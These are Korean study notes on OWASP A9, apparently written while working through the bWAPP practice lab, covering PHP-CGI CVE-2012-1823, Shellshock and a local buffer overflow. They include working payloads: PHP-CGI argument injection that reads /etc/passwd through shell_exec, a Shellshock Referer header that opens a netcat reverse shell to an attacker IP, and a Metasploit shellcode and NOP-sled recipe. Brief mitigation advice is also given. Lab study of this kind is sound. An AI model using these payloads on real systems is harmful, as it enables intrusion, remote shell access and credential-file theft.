# A9. 알려진 취약점이 있는 컴포넌트 사용(Using Components with Known Vulnerabilities)
- 웹 서비스 운영 시 영역별로 다양한 모듈과 라이브러리 사용
- 보안 상 안전하기 위해서는 정기적인 보안 패치가 필요

#### 제로데이 공격(Zeroday Attack)
- 패치가 아직 이루어지지 않은 상태에서 공개되는 공격
- 취약점이 공개된 시점과 패치가 발표되는 시점 사이에 존재

## #23 PHP CGI Remote Execution(CVE-2012-1823)
- PHP 5.3.12 이전 버전과 PHP 5.4.1, PHP 5.4.2 이전 버전에서 존재
- `sapi/cgi/cgi_main.c`에서 CGI 스크립트가 질의 문자열을 제대로 처리하지 못함

### 반디집 업데이트 웹 서버 해킹 사례
CVE-2012-1823을 이용하여 반디집 업데이트용 웹 서버에 백도어 스크립트 삽입
업데이터가 버전 체크 시에 접근하는 HTML 파일에 `iframe`을 사용하여 외부 사이트에 접근하도록 시도

### PHP-CGI
PHP는 CGI 기반으로, `mod_cgid`라는 모듈을 사용하여 동작할 때 `php-cgi`가 인자를 받아서 실행

#### php-cgi 옵션
`-n`: `php.ini` 파일을 사용하지 않음  
`-s`: 소스코드를 하이라이트하여 클라이언트에게 보여줌  
`-d`: `php.ini`에 정의된 설정 내용을 임의로 설정

설정 | 내용
--- | ---
allow_url_fopen=1 | 외부의 URL로부터 파일을 호출함
allow_url_include=1 | 외부의 파일을 include, include_once, require, require_once와 같은 파일로 포함을 허용
auto_prepend_file=php://input | HTTP Request Body로 데이터를 가져와 실행

### Payload
### Source Disclosure(소스 노출)
**/bWAPP/admin** 페이지에서 URL 뒤에 ?-s를 입력하면 소스코드가 출력된다.

### Remote Code Execution(원격 코드 실행)
URL에는 `-d allow_url_include=1 -d auto_prepend_file=php://input`  
Request의 Body에는 `<?php $output = shell_exec('cat /etc/passwd'); echo "$output"; die;`  
를 입력하면 `passwd` 파일의 내용이 페이지에 출력된다.

`?-d auto_prepend_file=/etc/passwd+ -n`을 입력하면 `passwd` 파일의 내용을 페이지에 출력한다.

### Reverse Shell Connection(리버스 쉘 커넥션)
`nc`로 통신을 열고 쉘 코드를 Body에 넣어 요청을 보내면 쉘을 획득할 수 있다.(쉘 코드는 검색)

대응방안
PHP 버전을 업데이트하거나 `php-cgi`를 비활성화시킨다.

---
## #24 셀쇼크(ShellShock) 취약점(CVE-2014-6271)
- 2014년 9월 24일 Stephane Chazelas에 의해 GNU Bash가 공개됨
- 공격 범위: Mac OSX, Android, OpenBSD, DHCP Client, SSH Server, CGI나 Apache를 사용하는 웹 서버, 공유기 등
- 영향을 받는 버전: GNU Bash 4.3 이하 버전
- 취약점 스캔, 악성코드 유포, DDoS 공격을 위한 본넷 구성 등

환경변수를 등록할 때 함수 선언 뒤에 명령어를 함께 입력하면 그 명령어가 실행된다.

### 취약점 분석
- Bash는 `bash-4.3/builtins/evalstring.c` 파일 내에 정의되어 있는 `parse_and_execute()` 함수를 통해 명령어를 처리하고 실행한다.
- 패치된 버전에서는 환경변수 처리 시 함수 선언문인지 확인하고 명령어 처리 횟수를 1회로 제한하여 `parse_and_execute()` 함수를 호출한다.
- 패치가 적용되긴 했지만 문제를 완벽하게 해결하지 못해 추가적인 취약점들이 발견되었다.(CVE-2014-7169, CVE-2014-7186, CVE-2014-7187)

### Reverse Shell Connection
`/bWAPP/cgi-bin/shellshock.sh`로 가는 요청에서 `Referer` 부분에 환경변수와 명령어를 입력한다.
```bash
() { :;}; echo "Vulnerable bWAPP:" $(/bin/sh -c "nc [kali ip address] 8888 -e /bin/bash")
```
터미널에 nc -lvp 8888을 입력하여 포트를 열어주고 위의 요청을 보내면 연결된다.

---
## #25 Buffer OverFlow(Local)
```Bash
# msfconsole
msf > use linux/x86/exec
msf payload(exec) > set cmd /bin/ps
msf payload(exec) > generate -b '\x00' -e x86/opt_sub -t raw -f /tmp/payload.txt
msf payload(exec) > exit

{ echo -n \'; cat /tmp/payload.txt; echo -n \'; } | perl -pe's/(.)sprintf("%%%02X", ord($1))/seg'
```
위의 명령어 입력 후 출력되는 쉘 코드를 복사한다.
이후 파이썬 코드로 `\x90 * 354 + \x8f\x92\x04\x08 + [쉘 코드]`를 출력할 수 있도록 작성한다.
출력된 내용을 검색 요청을 보낼 때 Body의 `title` 값을 바꿔 넣어 요청을 보낸다.
그러면 위에서 설정한 `cmd` 명령어의 결과가 페이지에 출력되는 것을 확인할 수 있다.
